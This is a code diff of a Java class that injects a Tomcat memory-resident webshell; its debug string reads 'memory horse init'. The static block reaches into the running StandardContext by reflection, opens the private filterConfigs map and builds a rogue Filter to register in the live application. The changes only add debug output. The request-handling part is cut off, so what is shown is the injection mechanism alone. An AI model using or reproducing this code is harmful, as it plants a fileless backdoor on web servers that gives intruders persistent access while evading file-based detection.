@@ -17,7 +17,7 @@ import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Scanner;
 
-public class MTomcatFilter {
+public class MTomcatFilter  {
     static {
         try {
             String filterName = MTomcatFilter.class.getSimpleName();
@@ -25,7 +25,10 @@ public class MTomcatFilter {
             WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
             StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
 
+
+            System.out.println(standardContext.getClass()+"???");
             Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
+
             filterConfigs.setAccessible(true);
             HashMap hashMap = (HashMap) filterConfigs.get(standardContext);
 
@@ -34,8 +37,8 @@ public class MTomcatFilter {
                 Filter filter = new Filter() {
                     @Override
                     public void init(FilterConfig filterConfig) throws ServletException {
-                        //Filter.super.init(filterConfig);
-                        //System.out.println("内存马init");
+                        Filter.super.init(filterConfig);
+                        System.out.println("内存马init");
                     }
 
                     @Override
